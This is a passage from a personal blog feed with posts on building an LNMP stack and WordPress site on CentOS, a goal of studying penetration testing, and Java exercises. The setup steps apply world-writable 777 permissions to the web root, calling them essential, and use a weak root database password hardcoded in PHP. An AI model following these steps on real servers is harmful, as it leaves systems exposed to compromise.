id="关联php和NGINX"><a href="#关联php和NGINX" class="headerlink" title="关联php和NGINX"></a>关联php和NGINX</h2><p>配置nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- nginx配置文件</span><br><span class="line">[root@syw /usr/local/nginx/conf/]# vim nginx.conf </span><br><span class="line">server &#123;</span><br><span class="line">    listen        8800;</span><br><span class="line">    server_name   192.168.140.12;</span><br><span class="line">    location   / &#123;</span><br><span class="line">    root  /html/www;</span><br><span class="line">    index index.php index.html;</span><br><span class="line">  &#125;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">    root /html/www;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    fastcgi_pass  127.0.0.1:9000;</span><br><span class="line">    include fastcgi_params;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>– 编写动态资源文件进行验证</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@syw ]<span class="comment"># mkdir -p /html/www;cd /html/www</span></span><br><span class="line">[root@syw /html/www]<span class="comment"># vim test_php.php</span></span><br><span class="line"></span><br><span class="line">-- 编写一个php文件用于验证是否成功</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>进行访问测试</p><p><img src="cs-01.jpg" alt="&quot;cs&quot;"></p><h2 id="关联PHP和MySQL"><a href="#关联PHP和MySQL" class="headerlink" title="关联PHP和MySQL"></a>关联PHP和MySQL</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vi /html/www/test_SQL.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//$link_id=mysql_connect(&#x27;主机名&#x27;,&#x27;用户&#x27;,&#x27;密码&#x27;);</span></span><br><span class="line"><span class="comment">//mysql -u用户 -p密码 -h 主机</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;mysql successful by root !\n&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="cs-02.jpg" alt="&quot;Mysql&quot;"></p><h1 id="建立站点"><a href="#建立站点" class="headerlink" title="建立站点"></a>建立站点</h1><p>打开数据库进行登录配置<br>网页源代码下载<br>[免费wordpress网页源码下载]<a href="https://cn.wordpress.org/support/category/installation/">https://cn.wordpress.org/support/category/installation/</a><br>下载完成后使用xftp传到服务器的/html下，且解压完毕后，执行下面的操作</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /html</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mv</span> wordpress/* www/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> -R 777./www  -- 赋予权限是极为重要的！</span></span><br></pre></td></tr></table></figure><p>尝试使用IP地址+端口的形式直接访问：<br><img src="cs-03.jpg" alt="&quot;over!&quot;"></p><p>公网下打开 <strong>IP地址:端口</strong> ，会跳转到数据库页面，点击登录即可。</p><p>下面是成功登陆且设置成功的页面：</p><p><img src="cs-04.jpg" alt="&quot;yes&quot;"></p><p>搭建完成，算是建了一个云服务的个人博客站点吧。</p><p>被这搭建流程教育了qwq……继续努力加油。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 骇客 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> LNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LNMP-搭建且安装php/nginx/mysql</title>
      <link href="/2023/02/16/LNMP-study/"/>
      <url>/2023/02/16/LNMP-study/</url>
      
        <content type="html"><![CDATA[<p>搭建环LNMP</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>首先，准备好一台有公网ip的云Linux CentOS7服务器。个人原因：切换网络会使得IP地址频繁变动，使用云服务器可以大大降低这种影响。</p><span id="more"></span><h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><h2 id="安装-php-nginx-mysql"><a href="#安装-php-nginx-mysql" class="headerlink" title="安装 php+nginx+mysql"></a>安装 php+nginx+mysql</h2><p>首先，打开CentOS环境的虚拟机，查看IP地址。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">简单的输入下面指令获取IP地址</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="C1.png" alt="&quot;CentOS环境图&quot;"></p><h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-- remi源安装php</span><br><span class="line">yum remove -y epel-release.noarch</span><br><span class="line">yum install -y epel-release</span><br><span class="line"></span><br><span class="line">-- 到清华源去下载</span><br><span class="line">yum install -y https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/remi-release-7.rpm     </span><br><span class="line"></span><br><span class="line">-- 更新依赖</span><br><span class="line">yum --enablerepo=remi-php71 install -y php php-cli php-common php-devel php-embedded php-gd php-mbstring php-pdo php-xml php-fpm php-mysqlnd php-opcache php-mcrypt php-pecl-memcached php-pecl-mongodb php-pecl-redis</span><br><span class="line"></span><br><span class="line">-- 编写配置文件(24/26行)，创建一个syw用户</span><br><span class="line">vim /etc/php-fpm.d/www.conf</span><br><span class="line">user = syw</span><br><span class="line">group = syw</span><br><span class="line">注意：这里是真的要创建一个名为syw的用户的！</span><br><span class="line">useradd syw</span><br><span class="line">passwd syw</span><br><span class="line"></span><br><span class="line">-- 启动php服务（一行执行比较方便）</span><br><span class="line">systemctl start php-fpm.service;systemctl enable php-fpm.service;systemctl status php-fpm.service</span><br></pre></td></tr></table></figure><p>为了启动方便，我把启动部分装在shell脚本当中。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-- 先执行命令打开文件</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi runPHP.sh</span></span><br><span class="line"></span><br><span class="line">-- 再写入文件内容</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">systemctl start php-fpm.service </span><br><span class="line">systemctl enable php-fpm.service</span><br><span class="line">systemctl status php-fpm.service</span><br><span class="line"></span><br><span class="line">-- 加上可执行权限</span><br><span class="line">chmod u+x runPHP.sh</span><br><span class="line"></span><br><span class="line">-- 运行脚本(注意：运行只需要使用绝对路径执行程序即可)</span><br><span class="line">./home/syw/runPHP.sh</span><br></pre></td></tr></table></figure><h3 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">-- 安装依赖包</span><br><span class="line"><span class="attribute">yum</span> -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel</span><br><span class="line"></span><br><span class="line">-- 创建并且进入文件夹</span><br><span class="line">cd /usr/local;<span class="attribute">mkdir</span> nginx;<span class="attribute">cd</span> nginx</span><br><span class="line">-- 下载且解压tar包</span><br><span class="line">wget http://nginx.org/download/nginx-1.13.7.tar.gz</span><br><span class="line">tar -xvf nginx-<span class="number">1</span>.<span class="number">13</span>.<span class="number">7</span>.tar.gz</span><br><span class="line"></span><br><span class="line">-- 安装nginx</span><br><span class="line">cd /usr/local/nginx;<span class="attribute">cd</span> nginx-<span class="number">1</span>.<span class="number">13</span>.<span class="number">7</span></span><br><span class="line">-- 执行命令 考虑到后续安装ssl证书 添加两个模块</span><br><span class="line">./configure --with-http_stub_status_module --with-http_ssl_module</span><br><span class="line">-- 执行make命令</span><br><span class="line">make</span><br><span class="line">-- 执行make install命令</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">-- 启动nginx </span><br><span class="line">​​​​​​​/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">-- 打开配置文件，配置端口和服务器IP地址</span><br><span class="line">vi /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  <span class="attribute">listen</span>  <span class="number">8800</span>; -- nginx的端口</span><br><span class="line">  <span class="attribute">server_name</span> <span class="number">192.168.140.12</span>; -- nginx的IP地址，可以是本机IP地址</span><br><span class="line">  ...(省略)</span><br><span class="line"></span><br><span class="line">-- 重启<span class="attribute">nginx</span></span><br><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">-- 查看进程是否启动</span><br><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure><p><img src="c-2.jpg" alt="&quot;查看进程是否启动&quot;"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 关闭防火墙（不建议，建议放行端口）</span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">-- CentOS6的关闭防火墙</span><br><span class="line">systemctl stop iptables.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 放行端口8800</span><br><span class="line">firewall-cmd --zone=public --add-port=8800/tcp --permanent</span><br><span class="line">-- 查询端口号80 是否开启</span><br><span class="line">firewall-cmd --query-port=80/tcp</span><br><span class="line">-- 重启防火墙(重要！这一步不能忽略！)</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">-- 安装完成一般常用命令</span><br><span class="line"># cd /usr/local/nginx/sbin</span><br><span class="line"></span><br><span class="line">-- 启动，关闭，重启，命令：</span><br><span class="line"># ./nginx 启动</span><br><span class="line"># ./nginx -s stop 关闭</span><br><span class="line"># ./nginx -s reload 重启</span><br></pre></td></tr></table></figure><p>访问 <strong>IP地址:端口</strong> 到默认网页</p><p><img src="c-3.jpg" alt="&quot;nginx&quot;"></p><h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 安装数据库软件</span><br><span class="line"># yum install mariadb-server mariadb -y</span><br><span class="line">-- 启动数据库服务</span><br><span class="line"># systemctl start mariadb.service </span><br><span class="line"># systemctl enable mariadb.service</span><br><span class="line">-- 创建数据库的用户和密码信息</span><br><span class="line"># mysqladmin -u root  password &#x27;123456&#x27;</span><br><span class="line">--密码登录mysql</span><br><span class="line"># mysql -u root -p123456   </span><br></pre></td></tr></table></figure><h2 id="实现LNMP之间建立关系"><a href="#实现LNMP之间建立关系" class="headerlink" title="实现LNMP之间建立关系"></a>实现LNMP之间建立关系</h2><p>等下一篇</p>]]></content>
      
      
      
        <tags>
            
            <tag> 骇客 </tag>
            
            <tag> LNMP </tag>
            
            <tag> 搭建环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年目标</title>
      <link href="/2023/02/14/goals-2023/"/>
      <url>/2023/02/14/goals-2023/</url>
      
        <content type="html"><![CDATA[<p>今年的目标自始至终其实只有一个，学习<span style="color:red"> <strong>网络安全技术</strong></span>，学习<span style="color:red"><strong>渗透测试技术</strong></span>。</p><span id="more"></span><h1 id="2023年目标"><a href="#2023年目标" class="headerlink" title="2023年目标"></a>2023年目标</h1><p>鉴于之前思路有些偏轨的问题，纠正下今年真正的目标 -&gt; 在前面</p><p>故：接下来的发展 <strong>主力方向</strong> 会朝着网络安全的方向发展。后续博客功能会加以完善，欢迎关注后续。</p><p><span style="color:red;font-size:1.5em"> <strong>没有攻不破的系统</strong> ， <strong>只有不努力的黑客</strong> </span></p><p>拓展：学习知识的办法–师傅领进门，修行靠个人。老师提点到，知识自己拓。</p><p>简单来说，知识不广就自己边学习边补充，拓开了和局促一室之内的感觉是完全不一样的。</p><p>当然，java会学点，但重心从这里开始就不偏向java了。未来可能会出现很多意外，出现很多变故，但无论如何改变，我会尽我所能的向着我想要的方向前进，而不是随意侧身到其他方向。之前懵懵懂懂，不知道什么方向。现在大概定下来了，不能像之前那样莽撞的偏颇了。</p><p>2023注定不是易行的一年，加油！</p>]]></content>
      
      
      <categories>
          
          <category> 方向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年目标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-13 递归阶乘问题</title>
      <link href="/2023/02/13/java-study-13/"/>
      <url>/2023/02/13/java-study-13/</url>
      
        <content type="html"><![CDATA[<p><strong>递归问题，方法传参(以对象为参数)</strong></p><h1 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h1><p>递归，本质上是对自己方法的反复调用。</p><span id="more"></span><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">recursion01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="type">Tools</span> <span class="variable">tos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tools</span>();</span><br><span class="line">        tos.test(<span class="number">30</span>); </span><br><span class="line">        System.out.println(tos.factorial(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tools</span> &#123;</span><br><span class="line">    <span class="type">int</span> numx=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//单纯的实现递归 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n&gt;<span class="number">2</span>) &#123;</span><br><span class="line">            numx += <span class="number">1</span>;</span><br><span class="line">            test(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// numx是最终数没有变化的原因：</span></span><br><span class="line">    <span class="comment">// 递归时就在不断的累加上去，累加到顶层再一层一层的打印下来</span></span><br><span class="line">    <span class="comment">// 导致最终只有n在变化而numx没有变化</span></span><br><span class="line">    System.out.println(<span class="string">&quot;n=&quot;</span>+n+<span class="string">&quot;numx=&quot;</span>+numx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实现n的阶乘</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    差不多是这样子的：</span></span><br><span class="line"><span class="comment">    f(5) = f(4)*5 </span></span><br><span class="line"><span class="comment">         = f(f(3)*4)*5 </span></span><br><span class="line"><span class="comment">         = f(f(f(2)*3)*4)*5</span></span><br><span class="line"><span class="comment">         = f(f(f(f(1)*2)*3)*4)*5</span></span><br><span class="line"><span class="comment">    当f(1)=1时，有：</span></span><br><span class="line"><span class="comment">    f(5) = 5*4*3*2*1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    数学的表示差不多就这样</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">factorial</span> <span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 当n=1时，返回整形1</span></span><br><span class="line">            <span class="comment">// 相当于f(1)=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当n不等于1时，返回的是f(n-1)*n</span></span><br><span class="line">            <span class="comment">// 相当于是f(5)=f(4)*5</span></span><br><span class="line">            <span class="keyword">return</span> factorial(n-<span class="number">1</span>)*n;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test与阶乘的结果集：<br><img src="test%E4%B8%8E%E9%98%B6%E4%B9%98%E7%9A%84%E7%BB%93%E6%9E%9C%E9%9B%86.jpg" alt="&quot;test与阶乘的结果集&quot;"></p><p><strong>下面引自老师的内存分析法：</strong></p><p>调用test时<br><img src="%E9%80%92%E5%BD%92.jpg" alt="&quot;调用test时&quot;"></p><p>调用factorial时<br><img src="%E9%98%B6%E4%B9%98.jpg" alt="&quot;调用factorial时&quot;"></p><h1 id="方法传参-以对象为参数"><a href="#方法传参-以对象为参数" class="headerlink" title="方法传参(以对象为参数)"></a>方法传参(以对象为参数)</h1><p>上课时听到的，方法调用对象作为参数时，会调用对象的地址，修改它的属性值时会影响到原先的属性值。但如果在引入对象作为参数时，将引入且创建出来的当前对象的地址指向别处时，当前对象的修改不会影响到原来被引入的对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">word</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Person创建一个对象，地址存入堆空间</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="comment">// 给对象的属性赋值</span></span><br><span class="line">        p.name = <span class="string">&quot;SYW&quot;</span>;</span><br><span class="line">        p.age = <span class="number">19</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;未被改变的对象属性:&quot;</span>+p.name+<span class="string">&quot; &quot;</span>+p.age);</span><br><span class="line">        <span class="comment">// 使用Temporary类创建一个对象</span></span><br><span class="line">        <span class="type">Temporary</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Temporary</span>();</span><br><span class="line">        <span class="comment">// 把对象p作为参数进行传入</span></span><br><span class="line">        <span class="comment">// (注意：对象是引用数据类型)</span></span><br><span class="line">        <span class="comment">// 此时传入的是对象p的地址，且传给的是形参的p1</span></span><br><span class="line">        tmp.force(p);</span><br><span class="line">        System.out.println(<span class="string">&quot;已被改变的对象属性:&quot;</span>+p.name+<span class="string">&quot; &quot;</span>+p.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建一个Person类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 创建一个Temporary对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Temporary</span> &#123;</span><br><span class="line">    <span class="comment">// 形参p1，自创建一个Person对象，并且对象的地址指向传入的实参p</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">force</span><span class="params">(Person p1)</span> &#123;</span><br><span class="line">        <span class="comment">// 因为p1指向的是实参p的内存地址拷贝</span></span><br><span class="line">        <span class="comment">// 当对其属性值进行替换时，会影响到实参p</span></span><br><span class="line">        p1.name = <span class="string">&quot;Python&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">133</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        什么情况不影响？实参p</span></span><br><span class="line"><span class="comment">        1.首先，得明确一点：p1仅仅是从实参p拷贝了一份地址过来</span></span><br><span class="line"><span class="comment">        简单来说就是：两者是分开声明的，拷贝的地址可以被替换掉</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        假设将p1置空：</span></span><br><span class="line"><span class="comment">        p1=null;</span></span><br><span class="line"><span class="comment">        那么p有可能被置空吗？</span></span><br><span class="line"><span class="comment">        答案是否定的。</span></span><br><span class="line"><span class="comment">        p1置空仅仅是p1没有调用那块地址而已。</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        假如你new了个新的Person：</span></span><br><span class="line"><span class="comment">        Person p1 = new Person();</span></span><br><span class="line"><span class="comment">        那么你将直接指向一个新的地址，抛弃原本拷贝的地址。</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        说白了，当p1抛弃引用实参p的地址拷贝时，形参p1修改成任何模样</span></span><br><span class="line"><span class="comment">        都不会影响到实参p</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C%E9%9B%86.jpg" alt="&quot;实验结果集&quot;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-12</title>
      <link href="/2023/02/12/java-study-12/"/>
      <url>/2023/02/12/java-study-12/</url>
      
        <content type="html"><![CDATA[<h1 id="数组的多问题"><a href="#数组的多问题" class="headerlink" title="数组的多问题"></a>数组的多问题</h1><p>随机生成10个整数(1~100的范围)保存到数组<br>并倒序打印以及求平均值、求最大值和最大值的下标.<br>并查找里面是否有 8</p><span id="more"></span><h1 id="拆解"><a href="#拆解" class="headerlink" title="拆解"></a>拆解</h1><p>这问题着实是有点多问……</p><p>稍微拆解下：</p><ol><li>随机生成10个整数，范围在1到100</li><li>倒序打印</li><li>求平均值、求最大值和最大值的下标</li><li>查找里面是否有 8</li><li>隐藏条件：随机数不重复</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">the_h02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">1) 随机生成10个整数,范围1到100</span></span><br><span class="line"><span class="comment">2) 倒序打印</span></span><br><span class="line"><span class="comment">3) 求平均值、求最大值和最大值的下标</span></span><br><span class="line"><span class="comment">4) 查找里面是否有 8</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ran_num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="comment">// 标志，当随机数出现重复时使用</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">bnum</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">// 生成随机数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">random_num</span> <span class="operator">=</span> (<span class="type">int</span>)(Math.random()*<span class="number">100</span>+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 检测随机数是否重复</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;ran_num ;i++ ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (random_num==arr[i]) &#123;</span><br><span class="line">                    <span class="comment">// 重复随机数时，将标志转为true</span></span><br><span class="line">                    bnum = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 标志成立时，跳过当前循环</span></span><br><span class="line">            <span class="keyword">if</span> (bnum) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 标志不成立时，开始将随机数写入数组</span></span><br><span class="line">            arr[index] = random_num;</span><br><span class="line">            System.out.print(arr[index]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index==(arr.length-<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;倒叙打印如下&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 倒叙打印</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            System.out.print(arr[arr.length-<span class="number">1</span>-i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 求平均值、求最大值和最大值的下标</span></span><br><span class="line">        <span class="comment">// 平均值的前提是求和</span></span><br><span class="line">        <span class="comment">// 求和数sum</span></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 最大数及其下标</span></span><br><span class="line">        <span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line">        index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">            sum+=arr[i];</span><br><span class="line">            <span class="keyword">if</span> (arr[i]&gt;max) &#123;</span><br><span class="line">                max = arr[i];</span><br><span class="line">                index=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;平均数：&quot;</span>+(sum/arr.length)+<span class="string">&quot;,最大数：&quot;</span>+max+<span class="string">&quot;,下标：&quot;</span>+index);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 最后一个问题，解决读取8的问题。</span></span><br><span class="line">        <span class="comment">// 读取的原理就是拆分。将数组的每个元素转换为字符串</span></span><br><span class="line">        <span class="comment">// 并且拆分为char类型进行比较</span></span><br><span class="line">        <span class="comment">// 一旦发现8，则打印信息并且跳过当前循环</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;arr.length;i++ ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">strs</span> <span class="operator">=</span> arr[i]+<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;strs.length() ;j++ ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (strs.charAt(j)==<span class="string">&#x27;8&#x27;</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;数组下标为&quot;</span>+i+<span class="string">&quot;的数包含8！&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="over.jpg" alt="&quot;结果集&quot;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-11</title>
      <link href="/2023/02/12/java-study-11/"/>
      <url>/2023/02/12/java-study-11/</url>
      
        <content type="html"><![CDATA[<p>题目如下：</p><h1 id="求出插入后的数组"><a href="#求出插入后的数组" class="headerlink" title="求出插入后的数组"></a>求出插入后的数组</h1><span id="more"></span><p>已知有个升序的数组，要求插入一个元素，该数组顺序依然是升序,比如:<br>[10，12，45，90]，添加23 后, 数组为 [10，12，23，45，90]</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">the_h01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 4.已知有个升序的数组，要求插入一个元素，</span></span><br><span class="line">        <span class="comment">// 该数组顺序依然是升序,比如:</span></span><br><span class="line">        <span class="comment">// [10，12，45，90]，添加23 后, 数组为 [10，12，23，45，90]</span></span><br><span class="line">        <span class="type">int</span>[] arr=&#123;<span class="number">10</span>,<span class="number">12</span>,<span class="number">45</span>,<span class="number">90</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 我以前的思路：</span></span><br><span class="line">        <span class="comment">// 先将arr拷贝到新数组</span></span><br><span class="line">        <span class="comment">// 再将arr扩容</span></span><br><span class="line">        <span class="comment">// 最后将新数组拷贝回去，将值新加到末尾。</span></span><br><span class="line">        <span class="comment">// 使用冒泡将其调换至升序的正确位置。</span></span><br><span class="line">        <span class="comment">// 当然，有这个想法时，时忽视了题目的</span></span><br><span class="line">        <span class="comment">// 原本就是升序，加进去依然是升序</span></span><br><span class="line">        <span class="comment">// 也就是说，我的思路本身能处理的东西实际上是：</span></span><br><span class="line">        <span class="comment">// 